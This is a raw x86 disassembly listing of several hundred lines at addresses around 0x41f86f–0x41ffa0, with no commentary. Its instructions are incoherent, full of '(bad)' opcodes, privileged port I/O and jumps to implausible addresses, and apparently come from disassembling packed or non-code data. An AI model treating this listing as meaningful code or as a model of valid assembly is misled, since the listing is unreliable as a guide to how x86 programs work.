  41f86f:	out    0x86,eax
  41f871:	iret   
  41f872:	repz cld 
  41f874:	mov    edi,0xb6b72d4a
  41f879:	xor    esi,eax
  41f87b:	repz out dx,al
  41f87d:	sub    BYTE PTR [ebp+eax*1-0x40a91aba],0x9f
  41f885:	out    dx,eax
  41f886:	mov    ah,0x5a
  41f888:	mov    DWORD PTR [edi+0x1a956175],edi
  41f88e:	add    BYTE PTR [eax+esi*1],ah
  41f891:	pop    ss
  41f892:	or     ch,dl
  41f894:	outs   dx,DWORD PTR ds:[esi]
  41f895:	(bad)  
  41f896:	cmp    DWORD PTR [ebx+0x3743fc11],ebx
  41f89c:	mov    eax,ds:0xc3a26d90
  41f8a1:	dec    esp
  41f8a2:	iret   
  41f8a3:	ds ret 0xd67d
  41f8a7:	and    al,0x3c
  41f8a9:	dec    edx
  41f8aa:	jb     0x41f8bd
  41f8ac:	jb     0x41f8bf
  41f8ae:	mov    al,0xe6
  41f8b0:	jg     0x41f8dc
  41f8b2:	xchg   ebx,eax
  41f8b3:	push   esi
  41f8b4:	mov    bl,0x23
  41f8b6:	(bad)  
  41f8b8:	push   DWORD PTR [edx]
  41f8ba:	fadd   DWORD PTR [eax-0x19a5fa31]
  41f8c0:	ins    DWORD PTR es:[edi],dx
  41f8c1:	ds sbb al,0xa4
  41f8c4:	sbb    eax,0xf0f3be39
  41f8c9:	xchg   ebx,eax
  41f8ca:	cli    
  41f8cb:	sbb    esp,esp
  41f8cd:	push   cs
  41f8ce:	fwait
  41f8cf:	add    DWORD PTR [edx],esi
  41f8d1:	in     al,0x9
  41f8d3:	out    0x37,al
  41f8d5:	(bad)  
  41f8d7:	mov    ebp,0x8eb2cd5e
  41f8dc:	nop
  41f8dd:	dec    edx
  41f8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8df:	lds    esp,FWORD PTR [edx+0x70]
  41f8e2:	enter  0x68bd,0x12
  41f8e6:	or     BYTE PTR [edx],ch
  41f8e8:	pop    eax
  41f8e9:	cmp    bh,ah
  41f8eb:	and    al,0x19
  41f8ed:	xchg   esp,eax
  41f8ee:	mov    dh,0x5d
  41f8f0:	ins    BYTE PTR es:[edi],dx
  41f8f1:	popf   
  41f8f2:	mov    ebp,edx
  41f8f4:	mov    ecx,0xb58cef9e
  41f8f9:	pop    ebp
  41f8fa:	test   ebp,esi
  41f8fc:	scas   eax,DWORD PTR es:[edi]
  41f8fd:	or     DWORD PTR [esi+ebp*8],ecx
  41f900:	test   al,0x3e
  41f902:	jle    0x41f8b0
  41f904:	cmp    ebp,DWORD PTR [ecx]
  41f906:	or     al,0xc3
  41f908:	aad    0x55
  41f90a:	ins    BYTE PTR es:[edi],dx
  41f90b:	dec    ebp
  41f90c:	cmp    eax,0x8184d35c
  41f911:	cld    
  41f912:	and    al,0x4d
  41f914:	pop    ds
  41f915:	or     edx,DWORD PTR [ebx]
  41f917:	out    dx,al
  41f918:	xlat   BYTE PTR ds:[ebx]
  41f919:	add    al,BYTE PTR [ebx]
  41f91b:	inc    ecx
  41f91c:	xchg   edx,eax
  41f91d:	dec    edx
  41f91e:	dec    eax
  41f91f:	lock and ecx,DWORD PTR [edi]
  41f922:	sbb    al,0x92
  41f924:	pop    ebp
  41f925:	dec    esp
  41f926:	mul    BYTE PTR [edi+ecx*2]
  41f929:	add    al,0xcc
  41f92b:	mov    al,ds:0xa39b8bad
  41f930:	div    BYTE PTR [ebp+0x2a]
  41f933:	inc    eax
  41f934:	sbb    cl,BYTE PTR [edx+0x0]
  41f937:	and    ch,ah
  41f939:	cmp    eax,0x14a079f3
  41f93e:	inc    ebp
  41f93f:	adc    DWORD PTR [edx],ecx
  41f941:	and    al,0xfa
  41f943:	hlt    
  41f944:	retf   0x88c3
  41f947:	mov    BYTE PTR [ebp+0x3f],dl
  41f94a:	cld    
  41f94b:	addr16 jg 0x41f8f3
  41f94e:	repz sbb BYTE PTR [ecx-0x11],cl
  41f952:	pmaxub mm0,QWORD PTR [ebx+0x7ab1d295]
  41f959:	(bad)  
  41f95a:	dec    esp
  41f95b:	jp     0x41f935
  41f95d:	mov    bl,0x50
  41f95f:	jmp    FWORD PTR [esp+ecx*2+0x337844a3]
  41f966:	sub    DWORD PTR [eax-0x619a3768],ebx
  41f96c:	sbb    eax,0x8ba1a098
  41f971:	xchg   esi,eax
  41f972:	(bad)  
  41f973:	xchg   ebp,eax
  41f974:	scas   al,BYTE PTR es:[edi]
  41f975:	mov    BYTE PTR [esi+0x3d],ch
  41f978:	out    0x32,al
  41f97a:	adc    al,0x3f
  41f97c:	jae    0x41f90a
  41f97e:	ss mov ebx,0x82c6c13c
  41f984:	in     al,0x81
  41f986:	xchg   ebx,eax
  41f987:	fsubr  DWORD PTR [ebx]
  41f989:	(bad)  
  41f98a:	shr    al,cl
  41f98c:	shl    BYTE PTR [eax-0x26],1
  41f98f:	mov    ecx,ebx
  41f991:	mov    ds:0xaee3d032,al
  41f996:	and    eax,0x70a66de7
  41f99b:	stos   DWORD PTR es:[edi],eax
  41f99c:	jg     0x41f971
  41f99e:	xor    ah,BYTE PTR [esi+0x5b9dc404]
  41f9a4:	and    bl,BYTE PTR [ebx+0x63073d32]
  41f9aa:	push   ebp
  41f9ab:	inc    eax
  41f9ac:	in     eax,dx
  41f9ad:	mov    eax,0x7bdbafbf
  41f9b2:	or     eax,0x888c6352
  41f9b7:	push   0xe0a17d4a
  41f9bc:	adc    eax,DWORD PTR [eax]
  41f9be:	dec    esi
  41f9bf:	xlat   BYTE PTR ds:[ebx]
  41f9c0:	xlat   BYTE PTR ds:[ebx]
  41f9c1:	xor    BYTE PTR [ecx-0x46],dh
  41f9c4:	mov    edi,0x33bd180a
  41f9ca:	push   esp
  41f9cb:	pop    esi
  41f9cc:	push   edi
  41f9cd:	mov    esp,0xf834df
  41f9d2:	shl    DWORD PTR [eax],1
  41f9d4:	shr    ah,cl
  41f9d6:	mov    al,0xb5
  41f9d8:	mov    dl,0x4e
  41f9da:	mov    ecx,0x518fcdf9
  41f9df:	jb     0x41fa46
  41f9e1:	lock (bad) 
  41f9e4:	adc    al,BYTE PTR [esi]
  41f9e6:	or     ch,bl
  41f9e8:	mov    ds:0x5fc6d152,al
  41f9ed:	xor    eax,0x48973c57
  41f9f2:	adc    DWORD PTR [edi],esi
  41f9f4:	in     eax,0x49
  41f9f6:	jmp    0x41fa2c
  41f9f8:	fisubr WORD PTR [eax-0x50]
  41f9fb:	mov    ecx,0x96ac3f8
  41fa00:	push   edx
  41fa01:	push   eax
  41fa02:	xchg   BYTE PTR [ecx],dh
  41fa04:	scas   eax,DWORD PTR es:[edi]
  41fa05:	jne    0x41f9f8
  41fa07:	mov    al,0xe0
  41fa09:	mov    ch,0x98
  41fa0b:	mov    ch,0xd6
  41fa0d:	dec    ebx
  41fa0e:	test   DWORD PTR [ecx],0x53d46399
  41fa14:	fst    DWORD PTR [edx+edi*8+0x71]
  41fa18:	mov    DWORD PTR [edi],ebp
  41fa1a:	xchg   esp,eax
  41fa1b:	adc    al,0x42
  41fa1d:	in     eax,0xdb
  41fa1f:	add    eax,0x11c900d3
  41fa24:	repz or BYTE PTR [ebp+0x5a47a41f],ah
  41fa2b:	adc    al,0xdb
  41fa2d:	dec    ebx
  41fa2e:	ins    BYTE PTR es:[edi],dx
  41fa2f:	rcl    edi,0xed
  41fa32:	mov    edi,0x82563baa
  41fa37:	pushf  
  41fa38:	xor    DWORD PTR [edi+0x6b240449],0xdfd8dae5
  41fa42:	add    DWORD PTR [ecx],0xc300fc7c
  41fa48:	push   edx
  41fa49:	xor    eax,edx
  41fa4b:	push   esp
  41fa4c:	mov    ch,0xd3
  41fa4e:	nop
  41fa4f:	jns    0x41fa61
  41fa51:	fidivr WORD PTR [esi]
  41fa53:	add    eax,0x674641f5
  41fa58:	xchg   esp,eax
  41fa59:	cld    
  41fa5a:	push   es
  41fa5b:	mov    dh,0xdd
  41fa5d:	push   ds
  41fa5e:	pop    ds
  41fa5f:	cmp    eax,0xec623bae
  41fa64:	mov    edi,0x2659d93f
  41fa69:	(bad)  
  41fa6a:	outs   dx,DWORD PTR ds:[esi]
  41fa6b:	leave  
  41fa6c:	adc    DWORD PTR [ebx],ebx
  41fa6e:	inc    edx
  41fa6f:	pusha  
  41fa70:	out    0xce,eax
  41fa72:	mov    bl,0x7a
  41fa74:	adc    eax,eax
  41fa76:	test   al,0x1c
  41fa78:	mov    esi,0x831e6344
  41fa7d:	dec    DWORD PTR [ecx+0x5f]
  41fa80:	inc    ebp
  41fa81:	push   es
  41fa82:	data16 mov cl,0x29
  41fa85:	std    
  41fa86:	xor    eax,0xc0455631
  41fa8b:	ds dec esp
  41fa8d:	xchg   edx,eax
  41fa8e:	fwait
  41fa8f:	inc    ecx
  41fa90:	(bad)
  41fa93:	sbb    al,0xb9
  41fa95:	pop    ss
  41fa96:	scas   eax,DWORD PTR es:[edi]
  41fa97:	popf   
  41fa98:	sbb    eax,0x5e331dae
  41fa9d:	sbb    al,0x65
  41fa9f:	pop    ecx
  41faa0:	add    DWORD PTR [ecx],esi
  41faa2:	pop    edx
  41faa3:	xchg   esi,eax
  41faa4:	adc    BYTE PTR [ecx],cl
  41faa6:	into   
  41faa7:	sub    al,0x97
  41faa9:	cmp    BYTE PTR [eax-0x36244d4d],dl
  41faaf:	push   ss
  41fab0:	adc    eax,0x4da518e9
  41fab5:	out    dx,eax
  41fab6:	push   ss
  41fab7:	in     eax,0x48
  41fab9:	push   edi
  41faba:	push   esi
  41fabb:	jns    0x41faa7
  41fabd:	fidivr DWORD PTR [eax]
  41fabf:	mov    edi,0xfa1a3faf
  41fac4:	retf   0xef21
  41fac7:	icebp  
  41fac8:	mov    WORD PTR [ebp+0x3],gs
  41facb:	imul   edi,DWORD PTR [esi+0x1e],0xd8c9d01b
  41fad2:	sub    BYTE PTR [ecx+eiz*1-0x2a],0x73
  41fad7:	pop    eax
  41fad8:	jge    0x41fa96
  41fada:	sbb    al,0x21
  41fadc:	out    dx,eax
  41fadd:	bound  esp,QWORD PTR [eax+ebx*1+0x2e43de6d]
  41fae4:	aad    0xda
  41fae6:	cwde   
  41fae7:	or     edx,DWORD PTR [ebx+0x1a]
  41faea:	sub    dh,BYTE PTR [ebx+0x27]
  41faed:	mov    ch,ch
  41faef:	test   eax,0x9dbc1b82
  41faf4:	add    al,BYTE PTR [eax-0x7590e15d]
  41fafa:	push   eax
  41fafb:	pop    ss
  41fafc:	cld    
  41fafd:	inc    esi
  41fafe:	in     eax,dx
  41faff:	lods   eax,DWORD PTR ds:[esi]
  41fb00:	pop    eax
  41fb01:	aam    0x6e
  41fb03:	and    al,0xae
  41fb05:	pop    ebp
  41fb06:	cwde   
  41fb07:	data16 (bad) 
  41fb09:	loopne 0x41fad0
  41fb0b:	fistp  DWORD PTR [edi-0x5004469]
  41fb11:	xchg   ebp,eax
  41fb12:	xchg   esi,eax
  41fb13:	jp     0x41fab2
  41fb15:	push   edi
  41fb16:	scas   eax,DWORD PTR es:[edi]
  41fb17:	mov    al,0xaf
  41fb19:	rcl    BYTE PTR [ecx-0x4e],0xdb
  41fb1d:	mov    dl,0xb1
  41fb1f:	push   eax
  41fb20:	mov    ah,BYTE PTR cs:[edi-0x30]
  41fb24:	nop
  41fb25:	jo     0x41fad7
  41fb27:	jo     0x41fac8
  41fb29:	mov    bl,0x7a
  41fb2b:	test   al,0x17
  41fb2d:	test   BYTE PTR [ebp+0x76],bh
  41fb30:	out    dx,eax
  41fb31:	or     cl,dl
  41fb33:	cli    
  41fb34:	out    0xe4,eax
  41fb36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb37:	xor    cl,BYTE PTR [ebx]
  41fb39:	(bad)  
  41fb3a:	ror    BYTE PTR ds:0xfde917e0,1
  41fb40:	cdq    
  41fb41:	xor    eax,0x9e840a1a
  41fb46:	call   0x7778f77f
  41fb4b:	add    dh,ch
  41fb4d:	test   al,0xd8
  41fb4f:	add    eax,0x8742779d
  41fb54:	sbb    dh,cl
  41fb56:	and    al,0xa8
  41fb58:	mov    ch,0xda
  41fb5a:	pop    es
  41fb5b:	add    al,0xc0
  41fb5d:	xchg   esi,eax
  41fb5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb5f:	(bad)  
  41fb60:	pop    ebx
  41fb61:	arpl   WORD PTR [eax+0x3138a2a0],di
  41fb67:	jno    0x41fb9c
  41fb69:	push   ss
  41fb6a:	arpl   WORD PTR ds:0x329c5c0c,sp
  41fb70:	repnz pop esp
  41fb72:	rol    DWORD PTR [edx],1
  41fb74:	gs or  eax,0xc549352b
  41fb7a:	sub    DWORD PTR [ebp+0x503bf8ae],0x0
  41fb81:	add    al,0x64
  41fb83:	push   edx
  41fb84:	int3   
  41fb85:	adc    DWORD PTR [edi+0xaeab0d3],edi
  41fb8b:	shl    eax,cl
  41fb8d:	sbb    al,0xc6
  41fb8f:	(bad)  
  41fb90:	(bad)  
  41fb91:	sbb    eax,0xc6bb23b3
  41fb96:	das    
  41fb97:	mov    esp,0xe73a27
  41fb9c:	stos   DWORD PTR es:[edi],eax
  41fb9d:	sahf   
  41fb9e:	aad    0x9f
  41fba0:	arpl   WORD PTR ds:0xe4f6de01,cx
  41fba6:	imul   ebp,DWORD PTR [ebx-0x31],0xffffffad
  41fbaa:	sub    dl,BYTE PTR [edi+0x26c0faed]
  41fbb0:	dec    edx
  41fbb1:	loopne 0x41fbc1
  41fbb3:	outs   dx,BYTE PTR ds:[esi]
  41fbb4:	ret    
  41fbb5:	cli    
  41fbb6:	sbb    BYTE PTR [edx+0x28],al
  41fbb9:	fadd   QWORD PTR [edi+0x69]
  41fbbc:	xor    dh,BYTE PTR [ebp-0x599cec69]
  41fbc2:	aam    0x75
  41fbc4:	inc    edx
  41fbc5:	push   esp
  41fbc6:	test   eax,0xfb859c4
  41fbcb:	cmp    al,0x28
  41fbcd:	in     al,dx
  41fbce:	inc    esi
  41fbcf:	push   0xe4116d1c
  41fbd4:	cmp    DWORD PTR ds:0xa50942b6,0xffffffb4
  41fbdb:	and    al,ch
  41fbdd:	fiadd  DWORD PTR ds:0x6a40c40c
  41fbe3:	jp     0x41fbda
  41fbe5:	fs jo  0x41fc58
  41fbe8:	dec    edx
  41fbe9:	das    
  41fbea:	pushf  
  41fbeb:	xchg   esp,eax
  41fbec:	push   ebx
  41fbed:	pop    esi
  41fbee:	jno    0x41fc57
  41fbf0:	sub    ch,bl
  41fbf2:	or     eax,0x6a613554
  41fbf7:	inc    esp
  41fbf8:	out    0x8a,eax
  41fbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbfb:	outs   dx,DWORD PTR ds:[esi]
  41fbfc:	subps  xmm0,XMMWORD PTR [edi]
  41fbff:	int    0x1a
  41fc01:	push   ds
  41fc02:	push   eax
  41fc03:	jb     0x41fbaf
  41fc05:	fmul   DWORD PTR [ebp+0x3d3a2b24]
  41fc0b:	dec    ecx
  41fc0c:	retf   0xb43e
  41fc0f:	fld    TBYTE PTR [esp+edi*8+0x695bb721]
  41fc16:	push   ebx
  41fc17:	or     bl,BYTE PTR [edi+0x51]
  41fc1a:	xchg   esi,eax
  41fc1b:	lock add BYTE PTR [ebx],ah
  41fc1e:	shl    DWORD PTR [edi],1
  41fc20:	(bad)  
  41fc21:	lods   eax,DWORD PTR ds:[esi]
  41fc22:	xchg   esp,eax
  41fc23:	outs   dx,BYTE PTR ds:[esi]
  41fc24:	cmp    al,0x43
  41fc26:	mov    DWORD PTR [eax],eax
  41fc28:	cs sahf 
  41fc2a:	jae    0x41fbc2
  41fc2c:	xchg   edx,eax
  41fc2d:	not    DWORD PTR [eax+eax*2-0xa5f519e]
  41fc34:	lds    edi,FWORD PTR ds:0x7999993e
  41fc3a:	or     BYTE PTR [ebx],0x6b
  41fc3d:	mov    BYTE PTR [ecx],ah
  41fc3f:	(bad)  
  41fc41:	pusha  
  41fc42:	mov    BYTE PTR [edi],dh
  41fc44:	xchg   esp,eax
  41fc45:	sub    eax,0xcaf9269c
  41fc4a:	push   0xffffff83
  41fc4c:	sub    eax,0xb8ccb81
  41fc51:	jo     0x41fcd0
  41fc53:	cmp    al,0xe1
  41fc55:	sbb    eax,DWORD PTR [ebp+ebx*4+0x3f22b8ab]
  41fc5c:	jg     0x41fbf0
  41fc5e:	rcr    DWORD PTR [eax+ebp*1+0xda203ba],0x5b
  41fc66:	hlt    
  41fc67:	ins    DWORD PTR es:[edi],dx
  41fc68:	fwait
  41fc69:	pusha  
  41fc6a:	cmp    DWORD PTR [eax+0x1b],ebp
  41fc6d:	popa   
  41fc6e:	into   
  41fc6f:	mov    esp,0xb33b09e2
  41fc74:	icebp  
  41fc75:	push   es
  41fc76:	lds    ebp,FWORD PTR [esi]
  41fc78:	pop    es
  41fc79:	cdq    
  41fc7a:	icebp  
  41fc7b:	pop    esi
  41fc7c:	std    
  41fc7d:	xchg   edi,eax
  41fc7e:	pop    esi
  41fc7f:	imul   ebp,DWORD PTR [edi+0x4],0x24
  41fc83:	cld    
  41fc84:	mov    cl,0xe
  41fc86:	adc    BYTE PTR [ebx-0x33],dh
  41fc89:	sar    bh,1
  41fc8b:	test   BYTE PTR [esi*1+0x25a9a27a],bh
  41fc92:	sbb    al,0xd0
  41fc94:	xor    DWORD PTR [edx],0x3d
  41fc97:	cwde   
  41fc98:	iret   
  41fc99:	ja     0x41fc57
  41fc9b:	fs js  0x41fc4c
  41fc9e:	popa   
  41fc9f:	adc    eax,0x13fe62ab
  41fca4:	cdq    
  41fca5:	mov    al,0xc7
  41fca7:	inc    ebx
  41fca8:	out    dx,eax
  41fca9:	xchg   bh,dh
  41fcab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcac:	cmovle edx,DWORD PTR [esi-0x1d]
  41fcb0:	mov    eax,ds:0x7ec0f7c4
  41fcb5:	xor    eax,ebp
  41fcb7:	rcr    BYTE PTR [ebx-0x2b6bcfbf],cl
  41fcbd:	add    al,0xde
  41fcbf:	ror    BYTE PTR [edx+edi*8],0x75
  41fcc3:	int3   
  41fcc4:	mov    ds:0x5c470f1a,al
  41fcc9:	int3   
  41fcca:	and    eax,0x1c64d69c
  41fccf:	push   ebx
  41fcd0:	daa    
  41fcd1:	push   edi
  41fcd2:	lods   eax,DWORD PTR ds:[esi]
  41fcd3:	cwde   
  41fcd4:	jg     0x41fc5e
  41fcd6:	lahf   
  41fcd7:	sub    eax,0x1e45bee7
  41fcdc:	pop    ss
  41fcdd:	(bad)  
  41fcde:	aam    0x1
  41fce0:	xchg   esp,eax
  41fce1:	push   edx
  41fce2:	fwait
  41fce3:	mov    edi,0x3968ef59
  41fce8:	add    al,BYTE PTR [esi+edi*2+0x50]
  41fcec:	adc    edx,DWORD PTR ds:0xf2cc9b7f
  41fcf2:	sub    esp,esp
  41fcf4:	mov    dh,0xbc
  41fcf6:	sub    DWORD PTR [esi],ebp
  41fcf8:	add    DWORD PTR [ebx+ebp*2-0xd],edi
  41fcfc:	dec    ebx
  41fcfd:	inc    esp
  41fcfe:	mov    bh,0xd0
  41fd00:	lds    esi,FWORD PTR [ecx]
  41fd02:	sbb    DWORD PTR ds:0xe4e942d2,eax
  41fd08:	inc    ecx
  41fd09:	inc    edi
  41fd0a:	inc    eax
  41fd0b:	mov    dh,0xf9
  41fd0d:	jl     0x41fd0f
  41fd0f:	push   DWORD PTR [edx+eiz*2+0x1bbe64de]
  41fd16:	ficom  DWORD PTR ds:0x3b96a33
  41fd1c:	xor    dh,BYTE PTR [ecx]
  41fd1e:	push   ebx
  41fd1f:	pop    edi
  41fd20:	repnz retf 0x3b3
  41fd24:	pop    ecx
  41fd25:	and    cl,BYTE PTR [ebp-0x1bcb1ca1]
  41fd2b:	pop    eax
  41fd2c:	xor    DWORD PTR [edi+0xf],eax
  41fd2f:	add    DWORD PTR [esp+edi*8],ebp
  41fd32:	shr    DWORD PTR [ebx-0x65db2e58],cl
  41fd38:	or     eax,0x64665f6d
  41fd3d:	pop    esp
  41fd3e:	cwde   
  41fd3f:	out    dx,al
  41fd40:	test   DWORD PTR es:[edx-0x624263e8],edi
  41fd47:	inc    edx
  41fd48:	sbb    dl,BYTE PTR [ebx]
  41fd4a:	aas    
  41fd4b:	mov    bh,0x59
  41fd4d:	pusha  
  41fd4e:	ret    0xf841
  41fd51:	jno    0x41fd30
  41fd53:	push   0xffffffb3
  41fd55:	pusha  
  41fd56:	dec    ecx
  41fd57:	popf   
  41fd58:	xchg   edi,eax
  41fd59:	popf   
  41fd5a:	mov    esp,0x4e0429c7
  41fd5f:	(bad)  
  41fd60:	xor    ch,cl
  41fd62:	(bad)  
  41fd63:	ror    BYTE PTR [esi+0x35],1
  41fd66:	cs push ss
  41fd68:	fisttp DWORD PTR ds:0x818a5e92
  41fd6e:	cmc    
  41fd6f:	xor    ecx,DWORD PTR [ebx+ebp*1-0x7]
  41fd73:	add    edi,DWORD PTR [edx+0x6e]
  41fd76:	pop    ds
  41fd77:	mov    ds,esp
  41fd79:	xor    eax,0x760bae17
  41fd7e:	aam    0x41
  41fd80:	inc    edx
  41fd81:	(bad)  
  41fd83:	js     0x41fd2f
  41fd85:	jo     0x41fd0a
  41fd87:	mov    ecx,0x37190859
  41fd8c:	or     DWORD PTR [edi+ebx*8+0x4d],esi
  41fd90:	lds    esp,FWORD PTR [edi]
  41fd92:	sub    ebp,DWORD PTR [eax+edi*4+0x37faed41]
  41fd99:	push   es
  41fd9a:	ins    BYTE PTR es:[edi],dx
  41fd9b:	leave  
  41fd9c:	idiv   BYTE PTR [esi+eiz*8-0x6d36b1fa]
  41fda3:	in     eax,0xa1
  41fda5:	jnp    0x41fe0c
  41fda7:	cmp    al,0x90
  41fda9:	(bad)  
  41fdaa:	fbld   TBYTE PTR [ebx]
  41fdac:	pop    eax
  41fdad:	inc    esi
  41fdae:	js     0x41fe21
  41fdb0:	loope  0x41fd34
  41fdb2:	fsubr  QWORD PTR [edx-0x4b]
  41fdb5:	jge    0x41fe1b
  41fdb7:	in     al,0xf4
  41fdb9:	adc    DWORD PTR [edx+edi*2],ebp
  41fdbc:	dec    esi
  41fdbd:	mov    eax,0x295a2211
  41fdc2:	jle    0x41fd80
  41fdc4:	push   ebx
  41fdc5:	lds    ebp,FWORD PTR [esi-0x34]
  41fdc8:	ror    BYTE PTR [ecx-0x2e646d0b],1
  41fdce:	sbb    eax,0x24d5cfb6
  41fdd3:	push   ds
  41fdd4:	repnz sbb dh,BYTE PTR [ebx]
  41fdd7:	jno    0x41fd59
  41fdd9:	mov    ebp,DWORD PTR [edi+0x1c2eaeb7]
  41fddf:	cwde   
  41fde0:	mov    dh,0xf6
  41fde2:	pop    esp
  41fde3:	sub    eax,0xfeb0bbcd
  41fde8:	sbb    edx,ebp
  41fdea:	mov    ebx,0xa2dcb9cd
  41fdef:	jle    0x41fe28
  41fdf1:	jns    0x41fe72
  41fdf3:	outs   dx,DWORD PTR ds:[esi]
  41fdf4:	inc    esi
  41fdf5:	test   BYTE PTR [esi+0x4c5d5403],0xce
  41fdfc:	xor    BYTE PTR [esi-0x22],dh
  41fdff:	in     eax,0x62
  41fe01:	mov    ch,0x27
  41fe03:	rep ins DWORD PTR es:[edi],dx
  41fe05:	(bad)  
  41fe06:	shr    DWORD PTR [edi],1
  41fe08:	sahf   
  41fe09:	mov    bl,0x11
  41fe0b:	adc    DWORD PTR [ecx+0x7ab691b7],eax
  41fe11:	and    cl,al
  41fe13:	lea    edx,[ecx+0x6e79c3ae]
  41fe19:	in     al,dx
  41fe1a:	add    dh,0x92
  41fe1d:	ret    0x428
  41fe20:	gs jnp 0x41fdbd
  41fe23:	cld    
  41fe24:	loop   0x41fe14
  41fe26:	sbb    eax,0x63c547fe
  41fe2b:	loopne 0x41fdca
  41fe2d:	and    edi,DWORD PTR [esi-0x13]
  41fe30:	ins    DWORD PTR es:[edi],dx
  41fe31:	mov    WORD PTR [edi-0x1b8060d],ss
  41fe37:	in     eax,0xaf
  41fe39:	sub    BYTE PTR [ecx],cl
  41fe3b:	mov    bl,0xbc
  41fe3d:	stos   DWORD PTR es:[edi],eax
  41fe3e:	and    al,0x47
  41fe40:	outs   dx,DWORD PTR ds:[esi]
  41fe41:	sbb    DWORD PTR [eax-0x44],edx
  41fe44:	lahf   
  41fe45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe46:	ret    
  41fe47:	inc    edx
  41fe48:	jmp    DWORD PTR [ecx+0x33e67e12]
  41fe4e:	iret   
  41fe4f:	mov    ds:0xf2b6c94f,al
  41fe54:	push   esp
  41fe55:	xchg   cl,dl
  41fe57:	imul   eax,DWORD PTR [edi+0xf],0xba7aa0ea
  41fe5e:	scas   al,BYTE PTR es:[edi]
  41fe5f:	xor    DWORD PTR [edx+eax*1],eax
  41fe62:	jmp    0x6a47:0x1fcae409
  41fe69:	jae    0x41fed9
  41fe6b:	jg     0x41fee7
  41fe6d:	mov    edx,0xe025d5fc
  41fe72:	call   0xde1ed977
  41fe77:	sbb    esi,DWORD PTR [edi-0x66]
  41fe7a:	repz pop edi
  41fe7c:	add    esi,DWORD PTR [edi-0x54dd9f2f]
  41fe82:	stos   DWORD PTR es:[edi],eax
  41fe83:	ret    0x2762
  41fe86:	inc    edi
  41fe87:	jo     0x41fee3
  41fe89:	retf   0x4a45
  41fe8c:	mov    ds:0x32a6d648,al
  41fe91:	mov    esi,0x59f25e10
  41fe96:	xor    DWORD PTR [edx+edx*8-0x5d8247cf],0xffffffa0
  41fe9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe9f:	sbb    bl,BYTE PTR [esi+0x7a876e53]
  41fea5:	and    dh,dh
  41fea7:	jo     0x41fe6d
  41fea9:	mov    cl,0xe2
  41feab:	jbe    0x41ff27
  41fead:	jg     0x41fef7
  41feaf:	add    DWORD PTR cs:[ecx+ecx*1],0x152a8190
  41feb7:	jmp    0x41fe6e
  41feb9:	xor    eax,0x6b7b19ee
  41febe:	aad    0xed
  41fec0:	retf   0x46bf
  41fec3:	test   bl,cl
  41fec5:	loopne 0x41ff27
  41fec7:	jne    0x41fef4
  41fec9:	xchg   DWORD PTR [ecx+0x7],esi
  41fecc:	mov    bh,0x14
  41fece:	xor    DWORD PTR [edx+0x384292],ebp
  41fed4:	aad    0xb4
  41fed6:	or     BYTE PTR [ecx+0x13775670],0xc4
  41fedd:	sbb    eax,0xab817aa7
  41fee2:	pop    ds
  41fee3:	data16 mov al,0x54
  41fee6:	add    ah,al
  41fee8:	pop    esi
  41fee9:	sbb    al,0xdf
  41feeb:	and    al,0x9b
  41feed:	scas   eax,DWORD PTR es:[edi]
  41feee:	out    0x35,al
  41fef0:	xchg   esp,eax
  41fef1:	cmp    BYTE PTR [ebx+edi*8],bh
  41fef4:	or     ah,BYTE PTR ds:0x23b75a6a
  41fefa:	inc    ebp
  41fefb:	jbe    0x41fe9f
  41fefd:	mov    cl,0x35
  41feff:	test   bh,ah
  41ff01:	jecxz  0x41ff7d
  41ff03:	rol    BYTE PTR ds:0x75493dd1,1
  41ff09:	pusha  
  41ff0a:	fild   QWORD PTR [ecx]
  41ff0c:	popf   
  41ff0d:	fs jnp 0x41ff71
  41ff10:	add    al,0xfe
  41ff12:	xchg   ebx,eax
  41ff13:	into   
  41ff14:	xor    al,ah
  41ff16:	jmp    0x41fec5
  41ff18:	pop    ds
  41ff19:	xor    bp,0x11
  41ff1d:	in     al,dx
  41ff1e:	sub    eax,0xcc8cf4f2
  41ff23:	and    esp,DWORD PTR [ebx]
  41ff25:	(bad)  
  41ff26:	sbb    al,0xb9
  41ff28:	jle    0x41ff83
  41ff2a:	les    edi,FWORD PTR [ecx-0x7367831]
  41ff30:	add    eax,0x1b88b867
  41ff35:	rcl    ch,cl
  41ff37:	repnz out 0x26,al
  41ff3a:	js     0x41ff5a
  41ff3c:	or     al,0x88
  41ff3e:	xor    DWORD PTR [eax+0x6af1f431],ecx
  41ff44:	sub    DWORD PTR [eax],ebx
  41ff46:	retf   0xd768
  41ff49:	jne    0x41fef6
  41ff4b:	dec    edi
  41ff4c:	xchg   esi,eax
  41ff4d:	jno    0x41ff4d
  41ff4f:	rol    BYTE PTR [eax-0x33f6a0fd],1
  41ff55:	loope  0x41fefa
  41ff57:	mov    dl,0x51
  41ff59:	rol    DWORD PTR [edi+esi*1],0xb1
  41ff5d:	pop    edi
  41ff5e:	add    eax,0x48a3dac9
  41ff63:	aam    0xa2
  41ff65:	xchg   edi,eax
  41ff66:	push   ss
  41ff67:	xor    DWORD PTR [ecx-0x54],esp
  41ff6a:	repz je 0x41ff64
  41ff6d:	in     al,0x3d
  41ff6f:	in     eax,0x81
  41ff71:	jmp    0x41ffa5
  41ff73:	inc    eax
  41ff74:	xchg   edx,eax
  41ff75:	shl    BYTE PTR [ebx+0x51],0xc4
  41ff79:	les    ebp,FWORD PTR [edx]
  41ff7b:	adc    ebx,DWORD PTR [edx]
  41ff7d:	xchg   BYTE PTR [ebx+0x44],dl
  41ff80:	xor    al,0xdd
  41ff82:	out    0x52,eax
  41ff84:	mov    esi,0xbf86a3f2
  41ff89:	sar    DWORD PTR [edi+ecx*4-0x70],0xf8
  41ff8e:	test   al,0xdd
  41ff90:	dec    edx
  41ff91:	pop    edx
  41ff92:	fistp  WORD PTR [edx-0x2e]
  41ff95:	xchg   DWORD PTR [esi+esi*8],esi
  41ff98:	(bad)  
  41ff99:	jns    0x41ff27
  41ff9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff9c:	or     ebx,DWORD PTR [eax]
  41ff9e:	scas   eax,DWORD PTR es:[edi]
  41ff9f:	scas   eax,DWORD PTR es:[edi]
  41ffa0:	pop    edx
